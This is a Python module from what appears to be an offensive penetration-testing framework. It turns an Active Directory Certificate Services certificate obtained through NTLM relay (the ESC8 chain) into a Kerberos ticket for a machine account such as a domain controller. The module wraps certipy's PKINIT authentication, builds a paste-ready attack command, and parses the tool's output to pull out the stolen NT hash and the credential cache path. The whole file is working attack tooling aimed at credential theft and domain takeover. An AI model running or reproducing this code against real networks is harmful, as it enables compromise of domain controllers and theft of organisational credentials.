"""PKINIT — turn an ADCS certificate into a Kerberos TGT.

The ESC8 chain's post-relay pivot: the relay step (D3) hands us a
certificate for a machine account (DC01$ etc.); this module presents
that certificate to the KDC via PKINIT and receives a TGT.

Wraps ``certipy-ad auth`` (the ce/certipy fork Kali packages) as the
primary implementation. Falls back to prepare-only playbook when
certipy isn't on PATH — same graceful-degrade shape D2's PetitPotam
and D3's ntlmrelayx follow.

Deliberately no from-scratch PKINIT client. impacket does have the
building blocks (KrbAsRepPa, PA_PK_AS_REQ, etc.) but the DH ephemeral
key + asn.1 pack is genuinely ~300 lines of code and mostly duplicates
what certipy already does correctly. The operator's Kali almost
always has certipy-ad; when it doesn't, the fallback command hint
gets them the same result in one paste.
"""
import os
import shutil
import tempfile
from dataclasses import dataclass

from . import runner


PKINIT_RESULT_KINDS = frozenset({
    "no-tool", "ok", "kdc-reject", "cert-invalid", "unreachable", "fail",
})


@dataclass(frozen=True)
class PkinitResult:
    """The result of one PKINIT request.

    :attr:`kind` — one of :data:`PKINIT_RESULT_KINDS`.
    :attr:`principal` — the principal PKINIT was for (CORP/DC01$).
    :attr:`ccache_path` — filesystem path to the credential cache
        certipy wrote when kind == "ok". Empty otherwise.
    :attr:`nt_hash` — NT hash derived from the TGT (certipy auth
        can pull this via UnPAC-the-hash). Empty when kind != "ok"
        or when the KDC didn't return a PAC.
    :attr:`command_hint` — for ``no-tool``, the paste-ready command
        the operator runs themselves.
    :attr:`detail` — verbatim tool output for diagnostics.
    """
    kind: str
    principal: str = ""
    ccache_path: str = ""
    nt_hash: str = ""
    command_hint: str = ""
    detail: str = ""

    def __post_init__(self):
        if self.kind not in PKINIT_RESULT_KINDS:
            raise ValueError(
                f"PkinitResult.kind must be one of {sorted(PKINIT_RESULT_KINDS)}, "
                f"got {self.kind!r}")


_TOOL_SEARCH_ORDER = ("certipy-ad", "certipy")


def find_tool(arsenal_hint=None):
    """Locate certipy on PATH (or arsenal_hint); None if missing."""
    for name in _TOOL_SEARCH_ORDER:
        p = shutil.which(name)
        if p:
            return p
    if arsenal_hint:
        for name in _TOOL_SEARCH_ORDER:
            p = os.path.join(arsenal_hint, name)
            if os.path.isfile(p) and os.access(p, os.X_OK):
                return p
    return None


#: Stable output signatures from certipy-ad's `auth` subcommand.
#: Kept as substrings for the same reason as the coerce module —
#: minor version shifts don't break the classifier.
_SIGNATURES = (
    # ok — got a TGT, wrote a ccache, printed NT hash (when UnPAC-able)
    ("Got hash for",             "ok"),
    ("Saved credential cache to", "ok"),
    ("Got TGT",                   "ok"),
    # KDC rejected the PKINIT — usually a cert-lookup mismatch or
    # KDC-side crypto disagreement.
    ("KDC_ERR_",                  "kdc-reject"),
    ("KDC_ERR_CERTIFICATE",       "kdc-reject"),
    ("kdc_error",                 "kdc-reject"),
    # Cert didn't parse or wasn't for the principal we asked for
    ("Failed to load certificate", "cert-invalid"),
    ("cannot decrypt PFX",         "cert-invalid"),
    ("Invalid password",           "cert-invalid"),
    # Reachability
    ("Connection refused",         "unreachable"),
    ("timed out",                  "unreachable"),
    ("Name or service not known",  "unreachable"),
)


def _classify(text):
    for sig, kind in _SIGNATURES:
        if sig in text:
            return kind
    return "fail"


_NT_HASH_RE = None    # lazy init to keep import cheap


def _extract_nt_hash(text):
    """Pull the aad3b435... : hex hex NT hash out of certipy's stdout.
    Empty string when the output didn't include one (KDC returned no
    PAC, or the target wasn't UnPAC-able)."""
    import re as _re
    global _NT_HASH_RE
    if _NT_HASH_RE is None:
        _NT_HASH_RE = _re.compile(
            r"(?:Got hash for [^\n]*\n?\s*)?"
            r"(aad3b435b51404eeaad3b435b51404ee:[0-9a-fA-F]{32})")
    m = _NT_HASH_RE.search(text)
    return m.group(1) if m else ""


def _extract_ccache_path(text):
    """Pull the ccache path certipy wrote from its stdout."""
    import re as _re
    m = _re.search(r"Saved credential cache to\s+['\"]?(\S+?\.ccache)",
                   text)
    return m.group(1) if m else ""


def _build_command_hint(tool_bin, principal, domain, dc, pfx_path, pfx_pass):
    tool = tool_bin or "certipy-ad"
    user = principal.split("/", 1)[-1].rstrip("$")
    parts = [
        f"{tool} auth",
        f"-pfx '{pfx_path}'",
        f"-username '{user}'",
        f"-domain '{domain}'",
        f"-dc-ip '{dc}'",
    ]
    if pfx_pass:
        parts.append(f"-password '{pfx_pass}'")
    return " ".join(parts)


def auth(principal, pfx_path, domain, dc_ip, pfx_pass="",
         tool_bin=None, tool_timeout=30, arsenal_hint=None):
    """Present ``pfx_path`` to ``dc_ip`` via PKINIT for ``principal``.

    Args:
      principal:   the certificate's subject; typically the machine
                   account (``CORP/DC01$``). certipy uses the
                   ``-username`` portion (last path segment, $ stripped
                   → ``DC01``) as the requested cname.
      pfx_path:    filesystem path to the PFX file. D3's relay step
                   persisted the cert base64 into Store; the caller
                   here materializes it to disk in a temp dir before
                   handing us the path.
      domain:      AD domain (``CORP.LOCAL``).
      dc_ip:       KDC to send the AS-REQ to.
      pfx_pass:    PFX passphrase; empty for the certipy-produced
                   certs (certipy defaults to no-pass PFX).
      tool_bin:    override the resolved certipy binary path.
      tool_timeout: subprocess timeout (default 30s; PKINIT is a
                   single AS-REQ round-trip, usually < 5s).
      arsenal_hint: additional search directory for certipy.
    """
    tool = tool_bin or find_tool(arsenal_hint=arsenal_hint)
    if not tool:
        return PkinitResult(
            kind="no-tool",
            principal=principal,
            command_hint=_build_command_hint(
                None, principal, domain, dc_ip, pfx_path, pfx_pass))

    user = principal.split("/", 1)[-1].rstrip("$")
    argv = [tool, "auth",
            "-pfx", pfx_path,
            "-username", user,
            "-domain", domain,
            "-dc-ip", dc_ip]
    if pfx_pass:
        argv += ["-password", pfx_pass]

    result = runner.run(argv, timeout=tool_timeout)
    if result.error and "not found" in result.error:
        return PkinitResult(
            kind="no-tool", principal=principal,
            command_hint=_build_command_hint(
                tool, principal, domain, dc_ip, pfx_path, pfx_pass))
    if result.timed_out:
        return PkinitResult(
            kind="unreachable", principal=principal,
            detail=result.stdout + result.stderr)

    output = result.stdout + result.stderr
    kind = _classify(output)
    if kind == "ok":
        return PkinitResult(
            kind="ok", principal=principal,
            ccache_path=_extract_ccache_path(output),
            nt_hash=_extract_nt_hash(output),
            detail=output)
    return PkinitResult(kind=kind, principal=principal, detail=output)
